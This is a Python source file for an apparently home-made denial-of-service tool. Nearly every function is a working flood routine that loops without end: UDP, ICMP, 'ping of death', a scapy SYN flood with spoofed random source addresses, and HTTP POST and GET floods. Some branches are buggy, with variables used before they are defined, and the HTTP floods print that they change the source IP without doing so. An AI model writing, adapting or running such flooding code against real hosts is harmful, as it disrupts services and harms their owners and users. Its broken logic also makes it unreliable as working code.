import requests as res
import socket as sockk
import random
import time
import ping3
import platform
from scapy.all import IP, TCP, send, RandShort

def random_ip():
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def random_port():
    return random.randint(1024, 65535)

class VolumeBasedAttack:
    @staticmethod
    def udp_flooding(bye: bytes, vector: list, port: int):
        addr = tuple(vector)
        s = sockk.socket(sockk.AF_INET, sockk.SOCK_DGRAM)
        try: 
            while True:
                for i in addr:
                    s.sendto(bye, (i, port))
        except Exception as e:
            print(f'Error occurred: {e}')
        finally:
            s.close() 

    @staticmethod
    def icmp(vector: list, bye: bytes):
        bye = int(bye)
        if platform.system() == 'Linux':
            wifi = input("In Linux, you can also use wifi in ping mode, do you want to? (y/n) \n")
            if wifi.lower() == 'y':
                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    for i in vector:
                        bytes_size = random.randint(56, 65500)
                        ping3.verbose_ping(i, interface='wifi0', size=bytes_size, count=0, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
            else:
                addre = input("You can also choose a source address, do you want to? (y/n) \n")
                if addre.lower() == 'y':
                    sources = input("Write the IP address(es): \n").split(" ")
                    bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                    if bytes_s == 'y': 
                        for i in vector:
                            for ad in sources:
                                bytes_size = random.randint(56, 65500)
                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                    else:
                        for ad in sources:
                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, size=bye, count=0, interval=0)

        elif platform.system() == 'Windows':
            response = input("You can choose a source address, do you want to? (y/n) \n")
            if response.lower() == 'y':
                sources = input("Write the IP address(es): \n").split(" ")
                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    print("ICMP attack with source address ", sources)
                    for i in vector:
                        bytes_size = random.randint(56, 65500)
                        for ad in sources:
                            ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                else:
                    for i in vector:
                        for ad in sources:
                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
            else:
                print("No source address selected.\n")
                for i in vector:
                    ping3.verbose_ping(i, size=bye, count=0, interval=0)

class ProtocolAttack:
    @staticmethod
    def pof(vector: list, bye: bytes):
        print("ping of death metod is a type of attack like icmp, but with more bytes, from 65501 to 65535")
        bye = int(bye)
        if platform.system() == 'Linux':
            wifi = input("In Linux, you can also use wifi in ping mode, do you want to? (y/n) \n")
            if wifi.lower() == 'y':
                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    print("ICMP attack with source address ", sources)
                    for i in vector:
                        bytes_size = random.randint(65500, 65535)
                        ping3.verbose_ping(i, interface='wifi0', size=bytes_size, count=0, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
            else:
                addre = input("You can also choose a source address, do you want to? (y/n) \n")
                if addre.lower() == 'y':
                    sources = input("Write the IP address(es): \n").split(" ")
                    bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
                    if bytes_s == 'y': 
                        print("ICMP attack with source address ", sources)
                        for i in vector:
                            bytes_size = random.randint(65500, 65535)
                            for ad in sources:
                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                    else:
                        for i in vector:
                            for ad in sources:
                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                                
                else:
                    for i in vector:
                        ping3.verbose_ping(i, size=bye, count=0, interval=0)

        elif platform.system() == 'Windows':
            response = input("You can choose a source address, do you want to? (y/n) \n")
            if response.lower() == 'y':
                sources = input("Write the IP address(es): \n").split(" ")
                bytes_s = input("u can also send casual bytes, from 65500 to 65535, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    print("pof attack with source address ", sources)
                    for i in vector:
                        bytes_size = random.randint(65500, 65535)
                        for ad in sources:
                            ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
                else:
                    for i in vector:
                        for ad in sources:
                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
            else:
                print("No source address selected.\n")
                bytes_s = input("u can also send casual bytes, from 65500 to 65535, u want to? (y/n) \n")
                if bytes_s == 'y': 
                    bytes_size = random.randint(65500, 65535)
                    for i in vector:
                        ping3.verbose_ping(i, size=bytes_size, count=0, interval=0)
                else:
                    for i in vector:
                        ping3.verbose_ping(i, size=bye, count=0, interval=0)



    @staticmethod
    def syn_flood(vector: list, port: list):
        print("this could be run only with root privilage")
        for tar in vector:
                for i in port:
                    ip_packet = IP(src=random_ip(), dst=tar)
                    tcp_packet = TCP(sport=random_port(), dport=int(i), flags="S", seq=random.randint(1000, 9000))

                    pkt = ip_packet/tcp_packet

                    send(pkt, verbose=0, loop=1)

        print(f"Pacchetto inviato da {ip_packet.src}:{tcp_packet.sport} a {ip_packet.dst}:{tcp_packet.dport}")

class ApplicationLayerAttack:
    @staticmethod
    def post(vector: list, bye: bytes):
        print(f"POST attack on {vector} with {len(bye)} bytes")
        print("Using POST method to:", vector)
        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
        time.sleep(10)
        count = 0  

        while True:
            for target in vector:
                if count % 4 == 0:  
                    src_ip = random_ip()
                    print(f"Changing source IP to: {src_ip}")

                response = res.post(target, data=bye) 
                print(response.text)
                count += 1

    @staticmethod
    def get(vector: list, bye: bytes):
        print(f"GET attack on {vector} with {len(bye)} bytes")
        print("Using GET method to:", vector)
        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
        time.sleep(10)
        count = 0  

        while True:
            for target in vector:
                if count % 4 == 0:  
                    src_ip = random_ip()
                    print(f"Changing source IP to: {src_ip}")

                headers = {
                    'Connection': 'keep-alive',
                    'Content-Length': str(len(bye)),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                }
                response = res.get(target, headers=headers, stream=True)

                for chunk in response.iter_content(chunk_size=4096):
                    if chunk:
                        print(f'Received chunk from {target}:', chunk[:100])
                
                count += 1

